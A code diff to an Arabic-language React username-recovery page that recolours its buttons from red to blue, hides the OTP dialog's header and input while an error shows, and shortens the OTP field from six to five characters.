@@ -341,7 +341,7 @@ export default function UsernameRecoveryPage() {
 
           {/* Continue Button */}
           <div className="pt-8">
-            <Button type="submit" className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg">
+            <Button type="submit" className="w-full bg-[#3111f3] hover:bg-blue-600 text-white py-4 rounded-full text-lg">
               استمرار
             </Button>
           </div>
@@ -352,27 +352,30 @@ export default function UsernameRecoveryPage() {
 
       <Dialog open={showOtp} onOpenChange={handleCloseOtp}>
         <DialogContent className="sm:max-w-md">
-          <DialogHeader>
+        {!otpError&&    <DialogHeader>
             <DialogTitle className="text-right">رمز التحقق</DialogTitle>
             <Button variant="ghost" size="icon" className="absolute left-4 top-4" onClick={handleCloseOtp}>
               <X className="h-4 w-4" />
             </Button>
-          </DialogHeader>
+          </DialogHeader>}
 
           <div className="space-y-4">
-            <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
+          {!otpError&&
+          <>
+           <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
 
             <div className="flex justify-center gap-3">
-              <Input
+           <Input
                 value={otpValues}
                 onChange={(e) => handleOtpChange(e.target.value)}
                 className="w-full h-12 text-center text-lg font-bold"
-                maxLength={6}
+                maxLength={5}
                 type="text"
                 inputMode="numeric"
               />
             </div>
-
+            </>    
+          }
             {otpError && (
               <div className="text-red-500 text-sm text-right bg-red-50 p-3 rounded-lg border border-red-200 space-y-3">
                 <p>{otpError}</p>
@@ -390,7 +393,7 @@ export default function UsernameRecoveryPage() {
 
             <Button
               onClick={handleContinue}
-              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
+              className="w-full bg-[#3111f3] hover:bg-blue-600 text-white py-4 rounded-full text-lg"
             >
               تأكيد
             </Button>
